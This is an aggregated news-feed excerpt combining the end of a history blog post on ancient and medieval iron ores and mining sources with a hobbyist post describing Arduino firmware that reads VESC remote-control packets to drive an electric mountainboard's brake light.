<p><strong>As with farming, there is a regional and chronological caveat necessary here</strong>: my research into metal production (and this, even more than farming, is core to my academic interests) is focused on the Roman world or – more broadly – on the broader Mediterranean and European tradition of metal-working.  There are some points where it will be necessary to note different methods or techniques in other parts of the world (early cast iron in China, for instance, or Wootz steel in India).  Likewise, I will do my best to capture changes in metal-working techniques in the medieval period.  What I am <em><strong>not </strong></em>going to cover in detail is <em>modern</em> steel and iron-working (that is, post-industrial-revolution), though I will occasionally note how it is different (the largest difference, by far, is that modern steel-making approaches the carbon problem from the opposite direction, with processes to <em>remove</em> carbon, instead of processes to add carbon).</p>



<p>I should also note that this post is going to focus on <em>iron</em>-working (and steel-working).  Copper and bronze, the other major tool-metals, are quite different (and may get their own series at some point)!</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>





<p><strong>Bibliography Note at the Outset</strong>: For the sake of keeping these posts readable, especially since I don’t have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I am going to include a bibliography up-front for the entire series.  For the beginner looking to get a basic handle on the pre-modern iron-production process, I think D. Sim &amp; I. Ridge, <em>Iron for the Eagles: The Iron Industry of Roman Britain</em> (2002) offers one of the best whole-process overviews.  On technical details of the forging process, note A.W. Bealer, <em>The Art of Blacksmithing</em> (1969), though much of the same may be learned by conversing with traditional blacksmiths.  H. Hodges, <em>Artifacts: An Introduction to Early Materials and Technology</em> (1989) is more diffuse, but still has some useful information on metal production.<br>There is a robust if somewhat aging literature on Roman mining and metallurgy.  Of particular note are (in publication order) J.F. Healy, <em>Mining and Metallurgy in the Greek and Roman World</em> (1978); R.F. Tylecote, <em>The Early History of Metallurgy in Europe</em> (1987); R. Shepherd, <em>Ancient Mining</em> (1993); P. Craddock, <em>Early Metal Mining and Production </em>(1995); V.F. Buchwald, <em>Iron and Steel in Ancient Times</em> (2005).  Each of these volumes has their own advantages.  Healy and Shepherd are more narrowly focused on Greek and Roman antiquity; Healy has the better coverage of processes, Shepherd the better catalog of known metal mining and processing sites in antiquity.  Both Tylecote and Craddock have a wider chronological reach; Craddock is in some ways an update of Tylecote, but the former has a stronger focus on artifacts than the latter.  Buchwald is narrowly focused on iron (the others all consider at least bronze, if not also non-tool metals) and of course, the most recent.  Finding any study on the condition of medieval mine-workers was difficult (being so far out of my field), but note J.U. Nef, “Mining and Metallurgy in medieval Civilisation” in <em>The Cambridge Economic History</em> <em>of Europe</em>, <em>volume 2: Trade and Industry in the Middle Ages</em>, 2nd. ed. (1987): 691-761.<br>For the particulars of how that iron might be turned into armor, note D. Sim and J. Kaminski, <em>Roman Imperial Armour: The Production of Early Imperial Military Armour</em> (2012) for the Roman period and A. Williams, <em>The Knight and the Blast Furnace: A history of the metallurgy of armour in the Middle Ages &amp; the early modern period</em> (2003).  For metallurgy as it fits into mobilization more generally, J. Landers, <em>The Field and the Forge: Population, Production and Power in the Pre-Industrial West</em> (2003) is a peerless starting point.<br>On the value and trade in metals in the ancient world, of particular note are M. Treister, <em>The Role of Metals in Ancient Greek History</em> (1996) and L. Bray, “‘Horrible, Speculative, Nasty, Dangerous’: Assessing the Value of Roman Iron,” <em>Britannia</em> 41 (2010): 175-185.  Both of these have valuable price-data from the ancient world.</p>



<h2>Iron Ores</h2>



<p>In most video games, if you are looking to produce some iron things, the first problem you invariably have is <em>finding some iron</em> <em>ores</em>.  Often iron is some sort of<a href="https://civilization.fandom.com/wiki/Iron_(Civ4)"> semi-rare strategic resource</a> available in <a href="https://anno1800.fandom.com/wiki/Iron_Mine">only certain parts of the map</a>, something that factions might fight over.  Actually finding some iron might be a serious problem.</p>



<p>Well, I have good news for <em>historical</em> you as compared to <em>video game</em> you: iron is the fourth most common <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust#cite_note-7">element in earth’s crust</a>, making up around 5% of the total mass of the part of the earth we can actually mine. Modern industry produces – and I mean this very literally – a <em>billion tons</em> (and change) of iron per year.  Iron is about the exact opposite of rare; almost all of the major ores of iron are dirt common.  <strong>And that’s the point</strong>.</p>



<p>One of the reasons that the change from using bronze (or copper) as tool metals to using iron was so important historically is that iron is just <em>so damn abundant</em>.  Of course iron can be used to make <em>better</em> tools and weapons as well, but only with proper treatment: initially, the advantage in iron was that it was <em>cheap</em>.  Now, as we’ll see, while the abundance of iron makes it cheap, the difficulty in working it poses technological problems; that’s why the far rarer and also generally inferior (to proper, work-hardened, heat-treated iron or steel; bronze will often exceed the performance of unalloyed iron) copper and bronze were used first: harder to find, easier to work.  We’ll get to the major problems with iron-working in subsequent weeks (they are in the processing, not the mining), but in brief the problems iron has is that it has a much higher melting point and that <em>cast</em> iron is functionally useless.  <strong>But let’s get back to those sources of iron</strong>.</p>



<p>Very small amounts of iron occur on earth as pure ‘native’ metal; the term for this, “<a href="https://en.wikipedia.org/wiki/Meteoric_iron">meteoric iron</a>” is an accurate description of where it comes from (there is also one known deposit of native ‘<a href="https://en.wikipedia.org/wiki/Telluric_iron">telluric iron</a>‘); in practice, the sum total of these iron sources is effectively a rounding error on the amount of iron an iron-age society is going to need and so ‘pure’ iron may be disregarded as a meaningful source of iron.</p>



<figure><img data-attachment-id="4509" data-permalink="https://acoup.blog/hematite_streak_plate/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg" data-orig-size="1280,547" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon PowerShot SX710 HS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1451453273&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.5&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.008&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="hematite_streak_plate" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Hematite">Via Wikipedia</a>, Hematite, leaving its characteristic red-rust streak.  The hematite on the left has a metallic lustre, whereas the hematite on the right has the (more common) earthy lustre.</figcaption></figure>



<p><strong>Instead, basically all iron was smelted from iron ores which required considerable processing to produce a pure metal</strong>.  There are quite a lot of ores of iron, but not all of them could be usefully processed with ancient or medieval technology.  The most commonly used iron ore was hematite (Fe<sub>2</sub>O<sub>3</sub>), with goethite (HFeO<sub>2</sub>) and limonite (FeO(OH)·<em>n</em>H<sub>2</sub>O) close behind.  Rarer, but still used was …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517792</guid>
            <pubDate>Fri, 18 Sep 2020 15:13:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Evening Project: Arduino based brake light controller for Electric Mountainboard]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517767">thread link</a>) | @gcds
<br/>
September 18, 2020 | https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: Arduino based brake light controller for VESC based Electric Mountainboard">
            </figure>

            <section>
                <div>
                    <p>I had a small request from my father to help him develop a small firmware for Arduino to control brake LED light for his electric mountain board, integrating with VESC to receive remote controller UART packets.</p><h2 id="some-explanations">Some explanations</h2><p>I know some of you have not heard Arduino, VESC, Electric Mountainboard, and similar terms.</p><h3 id="arduino">Arduino</h3><p><a href="https://www.arduino.cc/">Arduino</a> is an open-source hardware and software project and user community that designs and manufactures single-board microcontrollers and microcontroller kits for building digital devices.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-71.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-71.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-71.png 1000w, https://www.techprowd.com/content/images/2020/09/image-71.png 1020w" sizes="(min-width: 720px) 720px"></figure><p>In this project, our target will be the Arduino Pro Micro board based on the <a href="https://www.microchip.com/wwwproducts/en/ATmega32u4">ATMega32U4</a> processor featuring 32 KB self-programming flash program memory, 2.5 KB SRAM, 1 KB EEPROM, USB 2.0 full-speed/low-speed device, 12-channel 10-bit A/D-converter, and JTAG interface for on-chip-debug. The device achieves up to 16 MIPS throughput at 16 MHz. 2.7-5.5 volt operation.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-72.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-72.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-72.png 1000w, https://www.techprowd.com/content/images/2020/09/image-72.png 1032w" sizes="(min-width: 720px) 720px"></figure><h3 id="vesc">VESC</h3><p>The <a href="https://vesc-project.com/">VESC</a> (which stands for Vedder Electronic Speed Controller) is a more advanced ESC that allows for better motor and battery protection, regenerative braking, and programming options like acceleration-deceleration curves and other advanced features.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-73.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-73.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-73.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-73.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-73.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>It is an open-source ESC project and has many hardware projects based on its firmware.</p><h3 id="electric-mountainboard">Electric Mountainboard</h3><p>The Electric mountainboard, in simple terms, is an electrified mountainboard.</p><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg" width="4032" height="2877" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 2400w" sizes="(min-width: 720px) 720px"></p></div><div><p><img src="https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg" width="768" height="1024" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 768w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>Mountainboarding, also known as Dirtboarding, Offroad Boarding, and All-Terrain Boarding (ATB), is a well established[1] if little-known action sport, derived from snowboarding. This was initially pioneered by James Stanley during a visit in the 1900s to the Matterhorn where snow was not available. A mountainboard is made up of components including a deck, bindings to secure the rider to the deck, four wheels with pneumatic tires, and two steering mechanisms known as trucks. Mountainboarders, also known as riders, ride specifically designed boardercross tracks, slopestyle parks, grass hills, woodlands, gravel tracks, streets, skateparks, ski resorts, BMX courses, and mountain bike trails. It is this ability to ride such a variety of terrain that makes mountainboarding different from other board sports.</p><h2 id="remote-controller">Remote Controller</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-77.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-77.png 600w, https://www.techprowd.com/content/images/2020/09/image-77.png 768w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-leading-subject-the-brake-light">The leading subject the Brake Light</h2><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.18.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.18.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.13.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.13.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.26.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.26.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg 1280w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>This article's main subject is brake light, which is needed to work like car brake lights.</p><ul><li>Then the board is powered, it should shine with the brightness of around 45%</li><li>When the remote controller starts sending a brake signal, the Arduino should pick up the packets from the remote controller receiver, which are being sent to VESC and set brightness to 100% and return to 45% when the brake signal is released.</li></ul><p>The LED lamp is powered by the Mean Well LDD-H series LED driver, which can control LED brightness by providing a PWM signal.</p><p>The board is powered by 12S Li-Ion cells based battery pack with a standard voltage of 44.4V and a fully charged voltage of 50.4V.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-75.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-75.png 600w, https://www.techprowd.com/content/images/2020/09/image-75.png 1000w" sizes="(min-width: 720px) 720px"></figure><h2 id="schematic">Schematic</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-76.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-76.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-76.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-76.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-76.png 2400w"></figure><p>The schematic idea is pretty simple. Arduino receives the same packets as VESC from receiver via <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">UART</a>, from which I can decode the throttle position and accordingly adjust brake lights via <a href="https://en.wikipedia.org/wiki/Pulse-width_modulation">PWM</a> signal on LED driver.</p><h2 id="firmware">Firmware</h2><p>For firmware, I will be using Arduino software to write the firmware with C++ with some helper functions, instead of bit-banging registers by myself.</p><h3 id="first-step-vesc-packet-listener-handler">First step Vesc Packet Listener &amp; Handler</h3><p>To determine the throttle position of the Remote controller, I need to parse incoming serial data from the receiver as this type of remote controller uses VESC UART style control instead of a typical PPM (RC controller similar to PWM) style control mechanism.</p><p>I have built a small class to parse incoming serial data and extract the payload out of the received packet. I used <a href="https://github.com/SolidGeek/VescUart">SolidGeek/VescUart</a> library as a reference for the code. Added some magic to be able quickly to hook callback when a specific type of commands there received.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523pragma%2520once%250A%250A%2523include%2520%253CHardwareSerial.h%253E%250A%2523include%2520%2522vesc_types.h%2522%250A%250Atypedef%2520void%2520(*vesc_command_handler_callback)(uint8_t%2520*payload%252C%2520uint16_t%2520length)%253B%250A%250Atypedef%2520struct%2520%257B%250A%2520%2520%2520%2520vesc_command_id%2520commandId%253B%250A%2520%2520%2520%2520vesc_command_handler_callback%2520callback%253B%250A%257D%2520vesc_command_handler%253B%250A%250Aclass%2520VescUart%2520%257B%250Apublic%253A%250A%2520%2520%2520%2520explicit%2520VescUart(HardwareSerial%2520*port)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520malloc(sizeof(vesc_command_handler))%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlerSize%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253Eport%2520%253D%2520port%253B%250A%2520%2520%2520%2520%257D%250A%250A%2520%2520%2520%2520void%2520addCommandHandler(vesc_command_id%2520commandId%252C%2520vesc_command_handler_callback%2520callback)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520vesc_command_handler%2520handler%2520%253D%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.commandId%2520%253D%2520commandId%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520.callback%2520%253D%2520callback%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520realloc(%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%252C%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520(this-%253EcommandHandlerSize%2520%252B%25201)%2520*%2520sizeof(vesc_command_handler)%250A%2520%2520%2520%2520%2520%2520%2520%2520)%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bthis-%253EcommandHandlerSize%252B%252B%255D%2520%253D%2520handler%253B%250A%2520%2520%2520%2520%257D%250A%250A%250A%2520%2520%2520%2520bool%2520checkVescPacket()%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520payload%255B256%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520payloadSize%2520%253D%2520receivePacket(payload)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520if%2520(payloadSize%2520%253E%25200)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520uint8_t%2520commandId%2520%253D%2520payload%255B0%255D%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520for%2520(uint8_t%2520i%2520%253D%25200%253B%2520i%2520%253C%2520this-%253EcommandHandlerSize%253B%2520i%252B%252B)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520(this-%253EcommandHandlers%255Bi%255D.commandId%2520%253D%253D%2520commandId)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%255Bi%255D.callback(payload%252C%2520payloadSize)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520VESC%2520Packet%253A%2520%2522)%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520DEBUG_PORT.println(command)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520true%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520return%2520false%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520%257D%250A%2520%2520%2520%2520%257D%250A%250Aprivate%253A%250A%2520%2520%2520%2520HardwareSerial%2520*port%253B%250A%2520%2520%2520%2520vesc_command_handler%2520*commandHandlers%253B%250A%2520%2520%2520%2520uint8_t%2520commandHandlerSize%253B%250A%250A%2520%2520%2520%2520static%2520bool%2520unpackPayload(uint8_t%2520*packet%252C%2520uint16_t%2520length%252C%2520uint8_t%2520*payload)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcMessage%2520%253D%25200%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520uint16_t%2520crcPayload%2520%253D%25200%253B%250A%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%253D%2520packet%255Blength%2520-%25203%255D%2520%253C%253C%25208u%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520crcMessage%2520%2526%253D%25200xFF00u%253B%250A%2520%2520%2520%2520%2520%2520"><img src="https://www.techprowd.com/content/images/2020/09/carbon--26-.png" alt="carbon--26-"></a></p>
<!--kg-card-end: markdown--><h3 id="final-wrap">Final Wrap</h3><p>After having a way to hook into received VESC Commands, it's pretty easy to implement our simple LED dimming logic.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523include%2520%253CArduino.h%253E%250A%250A%2523define%2520DEBUG_PORT%2520Serial%250A%250A%2523include%2520%2522VescUart.h%2522%250A%250A%2523define%2520LED_DIMMER_PWM%25205%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520LED%2520DIMMER%2520PWM%2520PIN%2520(PWM%2520Compatible%2520PIN)%250A%2523define%2520LED_STATE_ON_POWER%2520HIGH%2520%2520%2520%2520%2520%2520%2520%2520%2520%252F%252F%2520HIGH%252FLOW%2520when%2520power%2520is%2520applied%2520to%2520MCU%250A%2523define%2520LED_BRIGHTNESS_ON_IDLE%2520115%2520%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%2523define%2520LED_BRIGHTNESS_ON_BRAKE%2520255%2520%2520%2520%2520%2520%252F%252F%25200-255%2520Brightness%250A%250A%2523define%2520THROTTLE_MIDDLE%2520127%250A%250AVescUart%2520*vescUart%253B%250A%250Avoid%2520handleSetChuckDataCommand(uint8_t%2520*payload%252C%2520uint16_t%2520length)%2520%257B%250A%2520%2520%2520%2520uint8_t%2520vescThrottleValue%2520%253D%2520payload%255B2%255D%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.print(%2522Received%2520new%2520throttle%2520value%253A%2520%2522)%253B%250A%2520%2520%2520%2520DEBUG_PORT.println(vescThrottleValue)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(vescThrottleValue%2520%253C%2520THROTTLE_MIDDLE)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_BRAKE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520setup()%2520%257B%250A%2520%2520%2520%2520pinMode(LED_DIMMER_PWM%252C%2520OUTPUT)%253B%250A%250A%2520%2520%2520%2520Serial1.begin(115200)%253B%250A%2520%2520%2520%2520vescUart%2520%253D%2520new%2520VescUart(%2526Serial1)%253B%250A%250A%2520%2520%2520%2520vescUart-%253EaddCommandHandler(COMM_SET_CHUCK_DATA%252C%2520handleSetChuckDataCommand)%253B%250A%250A%2523ifndef%2520DEBUG_PORT%250A%2520%2520%2520%2520DEBUG_PORT.begin(9600)%253B%250A%2523endif%250A%250A%2520%2520%2520%2520if%2520(LED_STATE_ON_POWER%2520%253D%253D%2520HIGH)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520analogWrite(LED_DIMMER_PWM%252C%2520LED_BRIGHTNESS_ON_IDLE)%253B%250A%2520%2520%2520%2520%257D%2520else%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520digitalWrite(LED_DIMMER_PWM%252C%2520LOW)%253B%250A%2520%2520%2520%2520%257D%250A%257D%250A%250Avoid%2520loop()%2520%257B%250A%2520%2520%2520%2520vescUart-%253EcheckVescPacket()%253B%250A%257D%250A"><img src="https://www.techprowd.com/content/images/2020/09/carbon--27-.png" alt="carbon--27-"></a></p>
<!--kg-card-end: markdown--><p>Compile and upload the code into Arduino, and it is ready to go.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-78.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-78.png 600w, https://www.techprowd.com/content/images/2020/09/image-78.png 970w" sizes="(min-width: 720px) 720px"></figure><p>You probably thinking, where is the DEMO? You wrote so much code and made a whole article, but there is no demo?</p><p>This project was basically done over the evening. Because of the timezone difference between me and Lithuania is 6 hours, I will not be able to get the demo video, but I will post it on <a href="https://twitter.com/techprowd">@techprowd</a> twitter and update the article after I receive it.</p><p>The final code archive will be uploaded on my <a href="http://patreon.com/techprowd">Patreon</a> for supporters, and I will be able to help with questions regarding how to use it there too!</p><p>I would like to include a shoutout to my father's company and an online store called <a href="https://shop.3dservisas.eu/?utm_source=techprowd">3DServisas</a>. It is primarily oriented to CNC machine custom orders, electric skateboard &amp; mountainboard parts, from gear drives to skateboard trucks.</p><p>If you are interested in building your own 